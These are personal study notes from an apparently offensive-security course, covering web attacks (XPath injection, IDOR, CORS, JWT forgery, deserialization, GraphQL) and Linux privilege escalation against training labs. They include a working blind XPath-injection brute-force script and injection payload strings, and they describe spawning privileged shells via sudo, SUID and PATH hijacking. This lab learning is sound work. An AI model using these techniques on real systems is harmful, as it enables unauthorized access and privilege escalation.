    
    ![[Untitled 324.png]]
    
    Now how we as attackers could have know that we have to try for XPATH
    
    Everytime you have an input is worth to try Input Validations, SQL Injection, XPath injections, NoSQL injection, Command Injections, etc.
    
    ![[Untitled 325.png]]
    
    At the time we try this, we could think is a SQLi
    
    ![[Untitled 326.png]]
    
    We could try SQL statements, since we cannot discard that the applicationis using SQL
    
    For example, we could try every SQL attack
    
    ![[Untitled 327.png]]
    
    ![[Untitled 328.png]]
    
    ![[Untitled 329.png]]
    
    So since we do not have a response, we could think that it is using XPath
    
    The first thing we need to know is how many primary tags we have
    
    In the case that we guess the number of tags the product will be shown in the page
    
    ![[Untitled 330.png]]
    
    See how if we put another number nothing is shown
    
    ![[Untitled 331.png]]
    
    So in this case we need to know the name of the primary tag that we found, so since for this lesson we know it, we try the syntax of the query
    
    ![[Untitled 332.png]]
    
    And since its correct, we have a response
    
    What we should do is try every character to guess the name
    
    using the following query (as we used in SQLi)
    
    ![[Untitled 333.png]]
    
    So, whit this we can make an script to bruteforce and gues the name of the primary tag that we found.
    
    Lets begin with the script
    
    ```Python
    #!/usr/bin/python3
    
    from pwn import *
    
    import requests
    import time
    import sys
    import pdb
    import string
    import signal
    
    \#CTRL+C
    def def_handler(sig, frame):
    	print("\n\n[!] Saliendo...")
    	sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)
    
    \#Variables Globales
    main_url = ""
    characters = string.ascii_letters
    
    def xPathInjection():
    	
    	data = ""
    	p1 = log.progress("Fuerza bruta")
    	p1.status("Iniciando proceso de fuerza bruta")
    	
    	time.sleep(2)
    	p2 = log.progress("Data")
    	
    	for position in range(1,8):  \#to know how long is the name of tag use search=1' and string-length(name(/*[1]))='<probar_numeros> Coffees = 7
    		for character in characters:
    			post_data = {
    				'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
    				'submit': ''
    			}	
    			
    			r = request.post(main_url, data=post_data)
    			
    			if len(r.text) != 8681: \#use response len test previous
    				data += character
    				p2.status(data)
    				break
    	
    	p1.success("Ataque concluido")
    	p2.success(data)
    	
    if __name__ == '__main__':
    	
    	xPathInjection()
    ```
    
    Perfect, we have the name of the primary tag
    
    ![[Untitled 334.png]]
    
    Now, we need to do the same with the secondary tags and its names
    
    With the following query and following the same concept as earlier
    
    ![[Untitled 335.png]]
    
    We should try until we have a response with the number that works
    
    Now to test the name for the ten tags
    
    ![[Untitled 336.png]]
    
    And if we try for every character
    
    ![[Untitled 337.png]]
    
    and now we make the same as the for the primary tag
    
    For the length
    
    ![[Untitled 338.png]]
    
    Script for secondary tags /Coffees/*
    
    ![[Untitled 339.png]]
    
    Now lets find the sub tags for /Coffees/Coffee/
    
    ![[Untitled 340.png]]
    
    We now wityh this query that there is 5 tags inside Coffee
    
    ![[Untitled 341.png]]
    
    Loop through characters
    
    ![[Untitled 342.png]]
    
    And the script modifies for this is
    
    ![[Untitled 343.png]]
    
    It iterates through every sub tag (we know that there are 5) every character position and every character
    
    ![[Untitled 344.png]]
    
    To reveal secret
    
    ![[Untitled 345.png]]
    
    ![[Untitled 346.png]]
    

## IDORs (Insecure Direct Object Reference)

The IDORs are a type of vulnerability that happens when a web application makes use of internal identifiers (names or numbers) to identify and access resources (files and data) and does not properly validate the user’s authorization.

For example, if a web application uses a numeric identifier for every registry in a database, an attacker could guess this identifiers and access data that should not be accessing.

This vulnerability is produced when the web application does not implement proper access control for the resources that are being managed. For example, the application could validate the authorization and authentication for UI elements but could be missing these validations over a URL.

  

To exploit this vulnerability the attacker could try to manually change an identifier from a URL or use an automated tool to try this. If the attacker succeeds to find an identifier and accesses to a resource that should not be able to access, the vulnerability was exploited successfully.

For example, lets assume that a user “A” has the ID 123 and the user “B” has the ID 124. If the attacker tries to access with the URL “https://example.com/orders/124”, the application could allow the access to these orders without the user having the permissions.

---

Lab used during lesson:

- **XVWA 1**: [https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)
- **SKF-LABS IDOR**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/IDOR](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/IDOR)

---

- PoC Lab
    
    ![[Untitled 347.png]]
    
    In this other lab of SKF
    
    ![[Untitled 348.png]]
    
    We can download the pdf we just created, but it says we can try IDs from 1 to 1500
    
    Let see in burpsuite how this is being transported.
    
    ![[Untitled 349.png]]
    
    Now using wfuzz we can try and fuzz every number.
    
    ![[Untitled 350.png]]
    
      
    

## CORS (Cross-Origin Resource Sharing)

CORS is a mechanism that allows a web server to restrict access to resources from diferent origins, i.e. from different domains or protocols. CORS is used to protect the privacy and security of the users by avoiding other sites to access confidential information wothout permission.

Let’s say that we have an application under “example.com” that uses a web API in the domain “api.example.com” to retrive data. If the web application is properly configured to use CORS, it will only allow cross-origin request from the domain “example.com” to the API in “api.example.com”. If this request is made from a different domain, like “attacker.com”, the request will be blocked by the browser.

However, if the application is not properly configured to use CORS, an attacker could pottentialy exploit this to access resources and confidential data. For example, if the web application does not validates th user’s authorization to access to the resources, the attacker could inyect code to make thi requests to the api located in “api.example.com”

The attacker may use automated tools to try different CORS headers values and found a misconfiguration that allows him to access the data from another domain. If the attacker succeds, it could access confiential data and different resources located under the domain.

---

- PoC Lab
    
    ![[Untitled 351.png]]
    
    ![[Untitled 352.png]]
    
    We can see in Burp that there is a misconfig
    
    ![[Untitled 353.png]]
    
    Lets try to make a malicious site that print everything from the legitimate site
    
    ![[Untitled 354.png]]
    
    ![[Untitled 355.png]]
    
    So, what we did here, is taking advantage from the misconfiguration in CORS and that the user (that felt in our phishing) is authenticated to the legitimate page, and stolen the info from /confidential directory.
    
    This is all because the session cookies are being used and the cross origin is allowed
    
    ![[Untitled 356.png]]
    
    So what should be happening in reality if this was paroperly configured?
    
    ![[Untitled 357.png]]
    
    ![[Untitled 358.png]]
    
    We can see that now the origin is the one we set in the code
    
    And our malicious site stopped working
    
    ![[Untitled 359.png]]
    
    ![[Untitled 360.png]]
    
    If a CORS is configurated to allow this domain “*.domain-a.com” we can by pass this by having the domain “Fdomain-a.com” thi is because the dot in the regex replace the first character so it will match to domain-a.com
    
    Enumeration of subdomains by using origin header
    
      
    

## SQL Truncation

This attack, is a technique in which we try to **truncate** or **cut** an SQL query to make malicious actions.

A common example of this is when an applicaiton has an input field that limits the data length, i.e. e-mail, and does not properly validates this entry.

Let’s assume that a web page has an input field to create a new user. In this field, the user has to provide an email and a password for the user. Now, looking this data in the database, lets assume that the input field for the email has an maximum input length of 17 characters in the database.

Lets take for example the user ‘admin@admin.com’ which exists in the database, at first we would not be able to create another user, since its being used. However, since this user ‘admin@admin.com’ has only 15 characters and has not reached the maximum, the attacker could register the user ‘admin@admin.com[space][space]a’, ‘admin@admin.com a’.

This new string that we created has a length of 18 characters. At first the email its different from ‘admin@admin.com’. however, since there is a length limit of 17 characters, once this goes through the filter and gets inserted into the database, the new length will be 17 characters, and as a result we will have the string ‘admin@admin.com ‘ or ‘admin@admin.com[space][space]’.

Now, what happens wit the [space]?, well since this characters do not represent information they will be truncated. This refers to erasing them from the string, so at the end we will have ‘admin@admin.com’, and with this registering this “new” user with the password we provided while registering.

This attack happens when the applications do not validates properly the input data to only truncate or cut the query instead of having an error.

---

Lab used during lesson  
•  
**Máquina Tornado de Vulnhub**: [https://www.vulnhub.com/entry/ia-tornado,639/](https://www.vulnhub.com/entry/ia-tornado,639/)

---

- PoC Lab
    
    For this lesson all the previous steps are going to be faster
    
    ![[Untitled 361.png]]
    
    ![[Untitled 362.png]]
    
    ![[Untitled 363.png]]
    
    ![[Untitled 364.png]]
    
    Here we should try every kind of injection, bu in this case we know that we have to go for a SQL truncation
    
    At first we see that the user length has a maximum
    
    ![[Untitled 365.png]]
    
    We can register a user with 13 length
    
    ![[Untitled 366.png]]
    
    ![[Untitled 367.png]]
    
    ![[Untitled 368.png]]
    
    The basis of this machine, is that there is an alias created from apache that aliases the /home of the user tornado to exploit and LFI and see the users
    
    ![[Untitled 369.png]]
    
    Note that ~tornado is an alias for /home/tornado
    
    If we try with user jacob, that has 13 characters
    
    ![[Untitled 370.png]]
    
    We can see that we are not able to exploit this, but since the validation is being done in client side, we can change it and add some characters
    
    ![[Untitled 371.png]]
    
    ![[Untitled 372.png]]
    
    What would happen now? Well since we are sending more than 13 characters, the filter from the DB is going to **cut** or **truncate** this and left us with ‘jacob@tornado’ and register the user with our password
    
    ![[Untitled 373.png]]
    
    ![[Untitled 374.png]]
    
    And voila, we are jacob now
    

## Session Puzzling / Session Fixation / Session Variable Overloading

These are different names that correspond to the same vulnerability that affects session management of a web application.

This vulnerability is produced when an attacker establishes a valid session identifier for a user to wait him to log in. If the user logs in with this session identifier, the attacker could access to the user’s session and make malicious actions. To accomplish this, the attacker could trick the user to click on a URL that includes this session identifier or exploit a weakness in a web application to establish this session ID.

The term “Session puzzling” refers to the same vulnerability but from a point where the attacker tries to **guess** or **generate** identifiers.

Last, “Session Variable Overloading” refers to a specific type of session fixation in which the attacker sends a great quantity of requests with the intention of overloading the session variables. If the application does not validate properly the amount of data that can be stored in the variables, the attacker may overload them with malicious data and cause problems with the performance.

---

  

---

- PoC Lab
    
    ![[Untitled 375.png]]
    
    This is the main page on which they try to represent this vulnerability.
    
    ![[Untitled 376.png]]
    
    As seen, we don't have anything on the storage tab referring to cookies.
    
    ![[Untitled 377.png]]
    
    Once we log in, we have a cookie
    
    ![[Untitled 378.png]]
    
    We can see that is a JWT and this is the info that this cookie has
    
    ![[Untitled 379.png]]
    
    If we go to forgot password session, and send the username of the account we forgot the password, the server assign us a cookie that lets us see the /dashboard without login in.
    
    ![[Untitled 380.png]]
    
    The basis of session puzzling is that we trick a user to log for us while we send a guessable session ID crafted in a URL, e.g. we discover that session id is crafted with the user ID → {”session_id”: 123456}, so we send the user the login page with the session id that we crafted in the URL → [https://dominio.com/login.php?session_id=123456](https://dominio.com/login.php?session_id=123456) → The user logs in and the server assings this session id, so since we know it we can use it in our side and be already logged in.
    

## JSON Web Token Enumeration & Exploitation (JWT)

JSON Web Tokens or JWT for short, are a type of token used in authentication and authorization of users in web applications. JWT is an open standard that defines a compact and safe format to transfer data among pairs in a trusty way

In regards of enumeration and exploitation of a JWT, this is produced when an attacker is capable of obtain information about the JWTs that are used in the application. This could allow the attacker to exploit weaknesses in the authentication and authorization of the application.

The JWT enumeration is produced when an attacker uses techniques of brute forcing or some reverse engineering to obtain information about the JWT used in the application. For example, the attacker could guess the values of a JWT by crafting **false tokens**, trying to validate if the app accepts them or not. If the attacker accomplishes this enumeration it could obtain confidential information like, usernames, passwords, roles, and other useful information.

The JWT exploitation is produced when an attacker uses the obtained information from the enumeration step to exploit the weaknesses. For example, if the application uses JWT for authentication, but does not properly validates the signature of the token, the attacker could guess this signature and false this to access the application in a legitimate way.

---

Lab used during lesson:  
•  
**SKF-LABS**: [https://github.com/blabla1337/skf-labs](https://github.com/blabla1337/skf-labs)

---

- PoC Lab
    
    JWT NULL CIPHER
    
    Once SKF labs are cloned
    
    ![[Untitled 381.png]]
    
    Once we install this project, this is the main page
    
    ![[Untitled 382.png]]
    
    Once we authenticate, the server assigns us the token.
    
    ![[Untitled 383.png]]
    
    This lab is based in JTW Null Cipher, this means that accepts NONE as algorithm.
    
    When we use NONE as algorithm, the signature portion of the JWT is not needed, so we would end with something like
    
    ![[Untitled 384.png]]
    
    Note that we created the header with alg=NONE and the payload with ID=2 to hijack the user2 session.
    
    If we paste this cookie in the browser, we can check if it works
    
    ![[Untitled 385.png]]
    
    And yes, we hijacked the sesion.
    
    ![[Untitled 386.png]]
    
    ---
    
    JWT SECRET
    
    Now in this second lab, the null algorithm does not work.
    
    We need to guess the secret of the JWT signature.
    
    ![[Untitled 387.png]]
    
    Once we change the JWT in the browser
    
    ![[Untitled 388.png]]
    
    ![[Untitled 389.png]]
    
      
    

## Race Condition

Race conditions are a type of vulnerability that can occur on systems that run two or more processes or threads run at the same time without a proper mechanism to synchronize them.

This means that if the two processes try to access the same resource at the same time, can lead to an unpredictable exit of these processes or even an undesired behaviour.

The attackers can take advantage of the race conditions to carry out a DoS, overwrite critical data, obtain unauthorized access to resources or even execute malicious code.

For example, lets assume that two processes try to access the same file at the same time, one to read and other to write. If there is no mechanism to synchronize the access to this file the read of the data can be wrong or that the writing of the data overwrites important data.

The impact of the race conditions on security depends of the nature of the resource and the type that can be achieved. Generally, race conditions allow the attacker to access critical resoruces, modify data or even take full control over a system. So it is important that developers and administrators take measures to avoid and mitigate race conditions.

---

Lab ussed during lesson

- **SKF-LABS Race Condition**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition)
- **SKF-LABS Race Condition 2**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition-file-write](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition-file-write)

---

- PoC Lab
    
    ![[Untitled 390.png]]
    
    So basically the app is creating a local file where it stores the name of the participant
    
    The file is called [hello.sh](http://hello.sh) and contains `echo “<user input>” > hello.txt` This then is executed and creates a file called **hello.txt** where contains the name of the participant.
    
    At first an we think of an RCE, but it is not possibly by itself since the application validates that in the user input lays only alphanumeric data as A-Za-z0-9.
    
    This is validated with a line using sed command → `sed -n ‘/^echo \”[A-Za-z0-9]*\” > hello.txt$/p’ hello.sh`
    
    ![[Untitled 391.png]]
    
    So what we have to do is execute this before it gets cleaned by this validation, this is where the race condition takes place to acomplish the RCE.
    
    So since this a race, we have to run, what we gonna do is to execute two request in parallel to see if we can at some point see the output before it gets cleaned.
    
    ![[Untitled 392.png]]
    
    At the top where making a request to main page where the output is shown, so is where the output of the command will be, and at the bottom we are sending the reqeust with the command `id` to inject
    
    And if we wait
    
    ![[Untitled 393.png]]
    
      
    

## CSS Injections (CSSI)

CSS Injections are a type of web vulnerablity that allows an attacker to inject CSS code in a web page. This occurs when an web application trusts user inputs and uses it directly in th CSS code.

Malicious CSS code may alter the styling and design of the web page allowing attackers to make actions like identity theft or confidential information stealing.

The injections can be used by attacker as a vector to then exploit XSS. Imagine that an input field of the application allows users to send text and then is shown in the web. If the developer do not validates properly this, an attacker may inject malicious code including JS.

If the CSS injected code is complex enough it may trick the browser to read the code as it is Javascript. This means that the CSS code can used to inject JS code, this is known as CSS induced JS injection.

Once the JS code has been injected in the web page it can be used by the attacker to make an XSS. Once in this point the attacker may inject another malicious script that steals credentials from the users or redirects them to another false web page among other posible vectors.

---

Lab used during lesson:  
•  
**SKF-LABS CSSI**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/CSSI](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/CSSI)

---

- PoC Lab
    
    ![[Untitled 394.png]]
    

## Python - Yaml Deserealization Attack (DES-YAML)

This is a type of vulnerability that can occur on application that make use of Python and use YAML to serialize and deserialize objects.

The vulnerability is produced when an attacker is able to control the YAML input that is sent to a deserealiztion function in the application. If this is not validated properly it may allow the attacker to inject malicious code using the deserialized object.

Once the object has been deserialized, malicious code can be executed in the application’s enviroment which could allow the attacker to take full control of the system, access sensible data or even RCE.

Also, the attacker could derive this DES-YAML vulnerabilties to make an DoS attack.

The impact of this vulnerability depends on the type and sensivity of the data that can be obtained. So, it is important that developer validate and filter properly YAML inputs used in the application.

---

Lab use during lesson  
•  
**SKF-LABS DES-Yaml**: [https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml)

---

- PoC Lab
    
    This is the main page of the site.
    
    ![[Untitled 395.png]]
    
    In the URL we have a base64 string
    
    This is the code of the app
    
    ![[Untitled 396.png]]
    
    If we decode the b64 string
    
    ![[Untitled 397.png]]
    
    And this is what the page shows, so we can be sure that this string is what the webpage shows
    
    ![[Untitled 398.png]]
    
    Now if we make a test and pass some b64 of our own
    
    ![[Untitled 399.png]]
    
    ![[Untitled 400.png]]
    
    Using our b64 string
    
    ![[Untitled 401.png]]
    
    btw data contains this
    
    ![[Untitled 402.png]]
    
    if we use this in the URL
    
    ![[Untitled 403.png]]
    
    We executed the ID command
    
      
    

## Python - Pickle Deserealization Attack (DES-Pickle)

This type of vulnerability can occur on application that make use of library Pickle for python to serialize and deserealize.

The vulnerability is produced when an attacker is able to control the Pickle input that is sent to a deserealization function in the application. If this is not validated properly it may allow the attacker to inject malicious code using the deserialized object.

Once the object has been deserialized, malicious code can be executed in the application’s enviroment which could allow the attacker to take full control of the system, access sensible data or even RCE.

Also, the attacker could derive this DES-Pickle vulnerabilties to make an DoS attack.

The impact of this vulnerability depends on the type and sensivity of the data that can be obtained. So, it is important that developer validate and filter properly Pickle inputs used in the application.

---

Lab used during lesson  
•  
**SKF-LABS DES-Pickle**: [https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle)

---

- PoC Lab
    
    ![[Untitled 404.png]]
    
    Once again, the object is opened without sanitization
    
    ![[Untitled 405.png]]
    
    Exploit for pickle
    
    ![[Untitled 406.png]]
    

## GraphQL Introspection,Mutations and IDORs

GraphQL is a query language for APIs. Unlike of traditionals APIs that have fixed endpoints, GraphQL allows clients to request only the information that they need and obtain a personalized request in base of the needs.

In GraphQL, Instrospection is a mechanism that allows clients to obtain information about the GraphQL scheme of an API. This means that clients can explore and discover the type of data, fields and relations that exists in the API which can be useful to developers that need to build GraphQL clients. However, Introspection can be used by attackers to obtain sensitive information about the architechture, infrastructure and data that exists on the API.

**Mutations** in GraphQL are operations that allows the clients to modify data in the API. In contrast to querys, that only allows to read data, the mutations allow clients to add, update or erase data. This means that the mutations have the potential to be used to make changes in the database. If this are not properly protected, the mutations can be exploited by attackers to make malicious changes.

In the context of GraphQL, IDORs can occur when an attacker is able to guess or enumerate IDs from the object within de APIs, and can use this IDs to access objects that should not have access to. This occurs by implementing bad Authorization and Authentication mechanisms.

For example, lets assume that a GraphQL API allows users to access information about the orders they made using the order ID. If the developer of the API did not properly impemented the authorization, an attacker may use the introspection of GraphQL to discover all the orders IDs that exists in the API, including the orders of other users. Using this IDs constitutes an IDOR.

---

Labs Used during lesson:

- **GraphQL Introspection**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-Introspection](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-Introspection)
- **GraphQL Mutations**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-Mutations](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-Mutations)
- **GraphQL Injection**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-Injection](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-Injection)
- **GraphQL IDOR**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-IDOR](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Graphql-IDOR)

---

- PoC Lab
    
    > [!info] GraphQL | HackTricks | HackTricks  
    > If you want to see your company advertised in HackTricks or download HackTricks in PDF Check the SUBSCRIPTION PLANS!  
    > [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)  
    
    - GraphQL IDORs
        
        ![[Untitled 407.png]]
        
        ![[Untitled 408.png]]
        
        Using Gobuster we saw the settings directory
        
        ![[Untitled 409.png]]
        
        If we go to this directory, we have user info
        
        ![[Untitled 410.png]]
        
        Now using burp, we can see that the query is being made to a /graphql directory
        
        ![[Untitled 411.png]]
        
        Now we can see that there is a ID, so if we change nothing should happen, rigth?
        
        ![[Untitled 412.png]]
        
        Well, it happened, the IDOR succeded since we are listing other user’s information
        
    - GraphQL Introspection
        
        ![[Untitled 413.png]]
        
        ![[Untitled 414.png]]
        
        Since this directory exists, we can use it to send our querys
        
        ![[Untitled 415.png]]
        
        Using hacktricks’s query
        
        ![[Untitled 416.png]]
        
        We have the response with the schema
        
        Now we paste this in the [GraphQLVoyager](https://graphql-kit.com/graphql-voyager/)
        
        ![[Untitled 417.png]]
        
        ![[Untitled 418.png]]
        
        Nowe that we know the fields
        
        ![[Untitled 419.png]]
        
          
        
    - GraphQL Mutations
        
        We have in this case a **create post** button
        
        ![[Untitled 420.png]]
        
        If we Intercept the request with Burp
        
        ![[Untitled 421.png]]
        
        If we change this values
        
        ![[Untitled 422.png]]
        
          
        

## Cuestionario

![[Untitled 423.png]]

revisar

![[Untitled 424.png]]

![[Untitled 425.png]]

![[Untitled 426.png]]

![[Untitled 427.png]]

![[Untitled 428.png]]

---

# Privilege Escalation Techniques

## Abusing Sudoers Privileges

The /etc/sudoers file is a configuration file of Linux Systems that is used to control the acces of the users to the different actions that can be done in the system. This file contains a list of the users and groups that have permission to carry adminitrator tasks on the system.

The **sudo** command allows users to execute commands as they were administrator or superuser. The sudoers file specifies which commands they can execute and with which privileges.

Abusing this privileges is a common technique among the attackers to elevate the access level to the compromised system. If an attacker is able to obtain access to an account with sudo permissions he will be ablo to execute commands with special privileges and make unwanted actions on the system.

The **sudo -l** command is used to list the sudo permissions of a particular user. By executing this command, a list of available commands is shown and under which conditions.

To prevent this abuse, it is recommended to maintain suitable permissions in the sudoers file and limit the amount of users with sudo permissions. Also, it is important that the file is regurlaly monitored.

  

GTFOBins resource which we use during the lesson  
•  
**GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/) 

---

- PoC Lab
    
    ![[Untitled 429.png]]
    
    ![[Untitled 430.png]]
    
    ![[Untitled 431.png]]
    
    Then apt update
    
    And install nano and sudo
    
    This is the /etc/sudoers
    
    ![[Untitled 432.png]]
    
    Two user are created, s4vitar and manolito
    
    Since this user are freshly created, they have no sudoer capabilities
    
    ![[Untitled 433.png]]
    
    Now lets assume that the user s4vitar asks the admin to give him privileges to execute **awk** command as sudo, this may not see as something harmfull since awk is for filtering words.
    
    Lets add this as ROOT in the sudoers files
    
    ![[Untitled 434.png]]
    
    ![[Untitled 435.png]]
    
    ![[Untitled 436.png]]
    
    Now if we look in GTFOBins, we can see that theres a potential way to execute a bash if we have awk as sudo
    
    ![[Untitled 437.png]]
    
    ![[Untitled 438.png]]
    
    And we do gain privileges
    
    Now we can gain privileges or just move horizontally (user pivoting)
    
    ![[Untitled 439.png]]
    
    In this case we can execute nmap as **manolito**
    
    Again using GTFOBins
    
    We have some thing to do with nmap binary
    
    ![[Untitled 440.png]]
    
    ![[Untitled 441.png]]
    
    So in this case change the user
    

## Abusing SUID Privileges

SUID privilege is a special permission that can be established on a binary of a Linux/Unix system. This permission gives the user that executes the binary the same privileges that the owner has.

For example, if a binary has SUID permission and the owner is root, whoever that executes this binary will adquire temporally the sames privileges of the root user, which allows to do things that the normal user could not do.

Abusing SUID privileges is a technique used by attackers to elevate its level of access on a compromised system. If an attacker is able to obtain acces to a binary file with SUID permissions, then he can execute commands with priveleges and make unwanted actions.

To prevent the abuse of SUID privileges, it is recommended to limit the number of SUID binaries and make sure that it is granted to the files that need this.

  

In this lesson we will use again GTFOBins.

---

- PoC Lab
    
    For this lesson, the SUID was assigned to the binary /usr/bin/base64
    
    ![[Untitled 442.png]]
    
    As we can see, as a normal user we cannot look the file /etc/shadow
    
    ![[Untitled 443.png]]
    
    But lets try to use base64 to this same file
    
    ![[Untitled 444.png]]
    
    And yes, we did this, since the base64 binary is being executed as root, and root has permissions to see the /etc/shadow file.
    
    Now as a normal user we can decode the b64 chain
    
    ![[Untitled 445.png]]
    
    ### Priv Esc
    
    Now for example if we set this SUID to the PHP binary. (to find the binary start lsiting the symbolic links)
    
    ![[Untitled 446.png]]
    
    ![[Untitled 447.png]]
    
    We can use GTFOBins to see if there is an exploit
    
    ![[Untitled 448.png]]
    
    And yes, we can, as seen we can execute a shell or a bash with -p param which indicates that spawns with privileges.
    
    ![[Untitled 449.png]]
    

## Cron Jobs detection and exploitation

A cron job or task is a programmed task in Linux/Unix systems that is executed between regular time intervals or in a determined time. These tasks are defined on the **crontab** file that specifies what commands and when should be executed.

The detection and exploitation of this tasks is a technique used by attackers to gain higher level of access in a compromised system. For example, if an attacker detects that a file is being executed by the root user in regular intervals using cron, and realizes that the permissions for the file are misconfigured, the attacker may manipulate this file and include specific instructions to gain access.

Now, to detect these tasks, the attackers can use tools like Pspy. Pspy is a shell tool that monitors background tasks in the system showing the new tasks that spawn.

With the objective of reduce the possibilities that an attacker exploits this cron tasks, it is recommended to carry out some of these key points:

- Limit the number of cron tasks: It is important to limit the number of cron tasks that are executed on the system and make sure that the permissions are granted only to those binaries that need it to work correctly.
- Verify the permissions of the tasks: It is important to make sure that the permissions are granted only to those users and groups that are authorized. It is advised not to give root permissions to the cron tasks, unless that it is strictly necessary.
- Regularly supervise the system: It is important to monitor regularly the system to detect unexpected changes on the cron tasks and posible security breaches.
- Configure the tasks logs: It is advised to activate the log option for the cron tasks, this lets us identify any suspicious activity.

---

Pspy tool link  
•  
**Herramienta Pspy**: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

---

- PoC Lab
    
    ![[Untitled 450.png]]
    
    Using crontab
    
    Once we create the script in the given route
    
    ![[Untitled 451.png]]
    
    ![[Untitled 452.png]]
    
    As seen, this executes at regular times.
    
    To detect this, we can make the following script based in the command ps -eo user,command
    
    ```Python
    #!/bin/bash
    
    old_process=$(ps -eo user,command)
    
    while true; do
    
    	new_process=$(ps -eo user,command)
    	diff <(echo "$old_process") <(echo "$new_process") | grep "[\<\>]" | grep -vE "procmon|command|kworker"
    	old_process=$new_process
    done
    ```
    
    ![[Untitled 453.png]]
    
    Now since im a normal user, and **others** can write this file, so we can change it
    
    ![[Untitled 454.png]]
    
    We change the script to
    
    ![[Untitled 455.png]]
    
    And now wait to change
    
    ![[Untitled 456.png]]
    
    Another way is to use pspy
    
    ![[Untitled 457.png]]
    
    Another way to download files to remote locations
    
    ![[Untitled 458.png]]
    
    # ANOTAR ESTO EN LOS RECURSOS RAPIDOS HOME PAGE
    

## PATH Hijacking

This is a technique used by attackers to hijack commands of a Linux/UNIX system by manipulating the PATH. The PATH is a enviroment variable that defines the routes in wichc the system looks up for binaries or executable files.

In some compiled binaries, some commands defined internally could identified by a relative path unlike an absolut path. This means that the binary looks the routes sepcified on the PATH.

If an attacker is able to alter this PATH and create a new file with the same name of one that is defined internally in the binary, it will acomplish the execution of a malicious command instead.

For example, if a compiled bianry uses the “ls” comand without its absolut path and the attacker is able to create a malicious file called “ls” in one of the specified routes in the PATH, the binary will execute the malicious file instead of the legitimate command “ls” command.

To prevent this attack, it is recommended to use absolute routes instead of relative in the commands defined inside the code. Besides, it is important that the PATH routes are controlled and limited to the needed routes in the system.

---

- PoC Lab
    
    Lets use this test.c script
    
    ![[Untitled 459.png]]
    
    Now if we execute this binary (that has SUID permissions) we are going to be root
    
    ![[Untitled 460.png]]
    
    But as an attacker we wonder if this command (which most likely is “whoami”) is being executed on its absolut or relative path.
    
    Since this is a compiled binary we cannot use “cat” so we can use tools like “strings”
    
    ![[Untitled 461.png]]
    
    ![[Untitled 462.png]]
    
    ![[Untitled 463.png]]
    
    And we see this, one absolut route and the command which is the relative path.
    
    This is a risk, since we acn Hijack the PATH env.
    
    ![[Untitled 464.png]]
    
    ![[Untitled 465.png]]
    
    Now if do this, we are adding the /tmp directory to the PATH env variable, so is going to look up in this directory for binaries.
    
    Now lets create a “whoami” script in the /tmp directory that executes `bash -p` since this compiled binary executes as root
    
    ![[Untitled 466.png]]
    

## Python Library Hijacking

When we talk about Python Library Hijacking, we refer to a technique that uses as advantage the way that python search and loads libraries to inject code. The attack is produced when the attacker creates or modifies a library in an accesible path for the python script, in this way, when the library is imported, the malicious version is loaded in the script.

The steps taken to make this attack work is: The attacker looks for a library used by the script and replaces it by its own malicious version. This library could be a standard python library or an external downloaded library. Then the malicious version is placed in an accesible path by the script and before the legitimate library is found and used.

Generally, Python starts looking for these libraries in the actual directory in which we are working and then in the paths defined by the sys.path variable. If the attacker has writing access to any of these paths, he can then place its own version of the malicious library, so the script found this malicious library first.

In addition, the attacker could also create its own library in the working directory, since python starts looking there for libraries. If during the loading of these libraries the attacker is able to hijack them, then he will be able to execute an alternative program.

---

- PoC
    
    For this example we will create this instruction on the sudoers file.
    
    ![[Untitled 467.png]]
    
    The user s4vitar is able to execute /tmp/example.py as the user manolito.
    
    ![[Untitled 468.png]]
    
    Now this is going to be the example script
    
    ![[Untitled 469.png]]
    
    As we can see its simple, it uses the library hashlib to encode some string to md5
    
    ![[Untitled 470.png]]
    
    Now, we can see that sys.path, looks first in the working directory, so we can use this to our advantage.
    
    We can create a “library” in the /tmp directory (since we have writing permissions there too) and then add some code
    
    ![[Untitled 471.png]]
    
    Now if we execute the /tmp/example.py script, we can see that we gain access as manolito
    
    ![[Untitled 472.png]]
    
      
    

## Abusing Incorrectly Implemented Permissions

In Linux systems, the files and directories have permissions that are used to control the access. The permissions are divided in three categories: Owner, Group and Others. Every category can have writing, reading and executing permissions. The permissions of a file can be modified by the owner or by the superuser.

The abuse of incorrectly implemented permissions occurs when the permissions of a critical file are incorrectly configured, allowing an unauthorized user to access or modify the file. This could allow the user to read confidential information, modify important files, execute malicious commands or even obtain superuser access.

In this way, the attacker could take advantage of this flaw to elevate its own permissions in the best-case scenario. One of the tools that take care of recognizing these flaws in the system is ‘**lse**’. Linux Smart Enumeration is a security enumeration tool for Linux systems, designed to help the administrators of a system and security auditors to identify or evaluate flaws and weaknesses in a system’s configuration.

LSE is designed to be easy to use and provide a clear and readable exit to ease the identification of security issues. This tool uses standard Linux commands and is executed on the command line, making no need of additional software. In addition, it enumerates a broad range of information of the system, including users, groups, services, open ports, scheduled tasks, files permissions, environment variables and firewall configurations among others.

---

